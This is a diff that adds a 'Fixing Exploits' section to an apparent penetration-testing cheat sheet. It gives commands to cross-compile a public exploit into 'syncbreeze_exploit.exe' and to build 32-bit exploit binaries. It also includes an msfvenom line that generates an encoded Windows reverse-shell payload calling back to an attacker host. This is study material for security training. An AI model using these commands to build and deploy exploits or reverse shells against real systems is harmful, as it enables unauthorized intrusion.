@@ -230,3 +230,15 @@
 - `tcpdump -n port 81 -r password_cracking_filtered.pcap`
 - `tcpdump -nX -r password_cracking_filtered.pcap`
 
+## Fixing Exploits
+- Cross Compiling Exploit Code
+	- `apt install mingw-w64`
+	- `i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe`
+	- `i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe -lws2_32`
+	- `msfvenom -p windows/shell_reverse_tcp LHOST=$IP LPORT=$PORT EXITFUNC= thread -f c –e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\3d"`
+
+- [Cross Compile to Windows from Linux](https://arrayfire.com/cross-compile-to-windows-from-linux/)
+	- Compile 32-bit program on 64- bit gcc
+		- `sudo apt-get install g++-multilib`
+		- `sudo apt-get install gcc-multilib`
+		- `gcc -m32 -Wl,--hash-style=both exploit.c -o exploit`
